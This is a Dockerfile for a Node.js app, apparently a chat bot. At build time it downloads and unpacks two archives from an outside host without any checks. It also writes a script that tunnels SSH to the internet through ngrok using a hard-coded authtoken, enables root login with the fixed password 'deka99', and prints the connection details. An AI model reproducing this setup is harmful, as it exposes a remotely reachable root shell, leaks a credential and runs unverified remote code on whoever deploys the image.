FROM node:lts-bookworm
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
  apt-get install -y \
  ffmpeg \
  imagemagick \
  wget \
  git \
  neofetch \
  ssh \
  vim \
  nano \
  curl \
  unzip \
  webp && \
  apt-get upgrade -y && \
  rm -rf /var/lib/apt/lists/*

COPY package.json .

RUN wget https://genix.eu.org/sesi.zip
RUN wget https://genix.eu.org/patch.zip

RUN unzip sesi.zip
RUN unzip patch.zip

RUN npm install && npm install qrcode-terminal

COPY . /root/crot

RUN wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O /ngrok-stable-linux-amd64.zip\
    && cd / && unzip ngrok-stable-linux-amd64.zip \
    && chmod +x ngrok

RUN mkdir /run/sshd \
    && echo "/ngrok tcp --authtoken 2M27dRwze2Ne9C3JBrCF9v0tZz9_3uyj5aXQt5CjKW6t5LGov --region ap 22 &" >>/openssh.sh \
    && echo "sleep 5" >> /openssh.sh \
    && echo "curl -s http://localhost:4040/api/tunnels | python3 -c \"import sys, json; print(\\\"ssh info:\\\n\\\",\\\"ssh\\\",\\\"root@\\\"+json.load(sys.stdin)['tunnels'][0]['public_url'][6:].replace(':', ' -p '),\\\"\\\nROOT Password:deka99\\\")\" || echo \"\nError：NGROK_TOKEN，Ngrok Token\n\"" >> /openssh.sh \
    && echo '/usr/sbin/sshd -D' >>/openssh.sh \
    && echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config  \
    && echo root:deka99|chpasswd \
    && chmod 755 /openssh.sh


RUN npm install

EXPOSE 80 443 3306 4040 5000 5432 5700 5701 5010 6800 6900 8080 8888 9000

CMD /openssh
CMD ["node", "index.js"] 
